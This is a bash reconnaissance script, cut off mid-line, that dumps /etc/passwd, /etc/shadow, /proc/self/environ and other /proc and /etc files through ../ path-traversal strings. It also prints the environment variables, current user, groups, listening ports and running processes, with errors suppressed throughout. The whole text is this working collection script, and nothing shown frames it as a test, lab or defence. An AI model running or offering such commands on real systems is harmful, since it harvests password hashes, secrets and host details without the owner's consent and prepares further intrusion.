#!/bin/bash

echo "===== /etc/passwd ====="
cat ../../../../../../../etc/passwd 2>/dev/null

echo "===== /etc/shadow (if accessible) ====="
cat ../../../../../../../etc/shadow 2>/dev/null

echo "===== /proc/self/environ ====="
cat ../../../../../../../proc/self/environ 2>/dev/null

echo "===== /proc/self/status ====="
cat ../../../../../../../proc/self/status 2>/dev/null

echo "===== /proc/self/cmdline ====="
cat ../../../../../../../proc/self/cmdline 2>/dev/null

echo "===== /proc/version ====="
cat ../../../../../../../proc/version 2>/dev/null

echo "===== /etc/hostname ====="
cat ../../../../../../../etc/hostname 2>/dev/null

echo "===== /etc/resolv.conf ====="
cat ../../../../../../../etc/resolv.conf 2>/dev/null

echo "===== /etc/hosts ====="
cat ../../../../../../../etc/hosts 2>/dev/null

echo "===== Environment Variables ====="
printenv 2>/dev/null

echo "===== Current User ====="
whoami 2>/dev/null

echo "===== User Groups ====="
groups 2>/dev/null

echo "===== Disk Usage ====="
df -h 2>/dev/null

echo "===== Active Network Connections ====="
netstat -tuln 2>/dev/null

echo "===== Running Processes ====="
ps aux 2>/dev/null | head -20

echo "===== Current Wo
